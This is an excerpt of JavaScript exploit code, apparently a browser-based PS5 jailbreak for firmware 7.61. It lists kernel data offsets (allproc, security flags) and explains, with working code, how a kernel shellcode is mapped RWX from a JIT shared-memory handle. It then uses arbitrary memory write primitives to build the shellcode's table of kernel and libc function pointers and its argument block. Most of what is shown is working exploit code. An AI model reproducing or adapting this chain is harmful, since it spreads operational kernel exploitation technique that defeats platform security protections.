...
(async function () {
    ...
    try {
        ...
        const FW_OFFSETS_P2JB = {
            ...
            // 7.61 — kernel DATA from offsets/7.61.js (hardware-proven via
            // poopsploit); derived TARGET_ID/QA/UTOKEN match its independent
            // constants exactly. PMAP_STORE/GVMSPACE unknown -> null-gated.
            "7.61": {
                DATA_BASE_ALLPROC: 0x034A9D50n,
                DATA_BASE_SECURITY_FLAGS: 0x01718064n
            },
        };
        const FW_ALIAS_P2JB = {
            "7.61": "7.61",
        ...
        //   * the thing that is EXECUTED is a KERNEL SHELLCODE, an api-table
        //     build of ps5-kexp (kexp-v0.7-b12c352.bin), mapped RWX from a jitshm
        //     CREATE handle - the one recipe with an observed success on this
        //     firmware (STAGE5-DONE joinRet=0 shellcodeRet=0x0, ps10_stage5 PASS).
        ...
        // Note the kexp shellcode itself calls pthread_create/pthread_join through
        // its api table, so it wants a thread with real TLS - another reason the
        ...
        // executes UD2 if any lookup fails; a WebProcess is refused by that resolver.
        // Since ps5-kexp b12c352 the shellcode instead accepts a pre-resolved API table
        // ('KXP2') in its args extension, so all that is left here is refuse-loudly
        // validation of the firmware profile - the binary itself is never modified.
        // kexp_launch builds the table from these offsets.
        function kexp_api_table() {
            ...
            if (missing.length)
                fail("kexp: firmware profile is missing " + missing.join(",")
                    + " - cannot fill the shellcode's api table");

            window.syncMark("KEXP-API-TABLE", "profile-ok"
                + " kbase=" + toHex(kbase) + " cbase=" + toHex(cbase)
                + " (12 entries, 0 dlsym syscalls)");
            return O;
        }
        ...
        async function kexp_launch(S) {
            ...
            // ---- 2. the kexp shellcode: validate, map RWX, copy in ---------------------
            const bin = read_file("kexp");
            const O = kexp_api_table();
            const sc_entry = kexp_map_rwx(bin);

            // ---- 3. the 0x38 argument block -------------------------------------------
            // Legacy prefix (0x00-0x27) layout from poops.js stage5. NOTE these are FOUR
            // PIPE fds - two pipe pairs - NOT the IPv6 socket pair the old payload_args
            // carried. poops builds them with two pipe2Nonblock() calls and stores them as
            // S.masterRfd/masterWfd/victimRfd/victimWfd (poops.js:9544-9546); p2jb's
            // setup_pipes_kernrw builds exactly the same two pairs into S.master_rfd/
            // master_wfd/victim_rfd/victim_wfd, so the mapping is one-to-one and nothing
            // here is inferred.
            ...
            // The v2 extension at 0x28 carries kexp's pre-resolved API table ('KXP2'):
            // 12 function pointers in kexp's fixed KEXP_API_* order, so the shellcode
            // performs zero dlsym syscalls (syscall 0x24f refuses a WebProcess).
            const api_table = malloc(0x60);
            write64(api_table + 0x00n, kbase + BigInt(O.lk_notify));
            write64(api_table + 0x08n, kbase + BigInt(O.lk_sysctlbyname));
            write64(api_table + 0x10n, kbase + BigInt(O.lk_pthread_create));
            write64(api_table + 0x18n, kbase + BigInt(O.lk_pthread_join));
            write64(api_table + 0x20n, kbase + BigInt(O.lk_getpid));
            write64(api_table + 0x28n, cbase + BigInt(O.lc_malloc));
            write64(api_table + 0x30n, cbase + BigInt(O.lc_free));
            write64(api_table + 0x38n, cbase + BigInt(O.lc_memcpy));
            write64(api_table + 0x40n, cbase + BigInt(O.lc_memset));
            write64(api_table + 0x48n, cbase + BigInt(O.lc_strcmp));
            write64(api_table + 0x50n, cbase + BigInt(O.lc_memcmp));
            write64(api_table + 0x58n, cbase + BigInt(O.lc_vsnprintf));

            const args = malloc(0x38);
            for (let q = 0n; q < 0x38n; q += 8n) write64(args + q, 0n);
            ...
            write32(args + 0x28n, 0x4b585032n);
            write32(args + 0x2Cn, 12n);
            write64(args + 0x30n, api_table);
            ...
            // itself has no fs: access (capstone over the whole blob) - its CALLEES do,
